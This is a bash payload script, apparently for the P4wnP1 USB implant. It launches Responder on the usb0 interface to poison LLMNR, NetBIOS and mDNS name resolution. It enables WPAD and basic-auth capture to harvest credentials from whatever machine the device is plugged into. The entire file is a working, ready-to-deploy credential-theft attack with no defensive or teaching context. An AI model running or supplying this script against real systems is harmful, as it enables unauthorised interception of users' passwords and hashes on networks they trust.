#!/bin/bash
# /opt/p4wnp1/payloads/network/responder_attack.sh
# Description: LLMNR/NetBIOS/MDNS poisoning using system-installed Responder

set -euo pipefail

# === Config ===
PAYLOAD_NAME="responder_attack"
IFACE="usb0"
LOG_DIR="/opt/p4wnp1/logs"
LOG_FILE="$LOG_DIR/${PAYLOAD_NAME}.log"

mkdir -p "$LOG_DIR"
exec > >(tee -a "$LOG_FILE") 2>&1

echo "[*] Starting Responder attack on $IFACE at $(date)"

# === Check Responder.py ===
if ! command -v Responder.py >/dev/null 2>&1; then
  echo "[!] Responder.py not found in PATH. Is it installed system-wide?"
  exit 1
fi

# === Kill any running Responder instances ===
pkill -f Responder.py || true
sleep 1

# === Launch Responder with common flags ===
# -w = WPAD, -F = fingerprint, -b = basic auth
echo "[+] Launching Responder.py on $IFACE with -wFb"
Responder.py -I "$IFACE" -wFb -v > "$LOG_FILE" 2>&1 &

echo "[✓] Responder poisoning active. Log: $LOG_FILE"
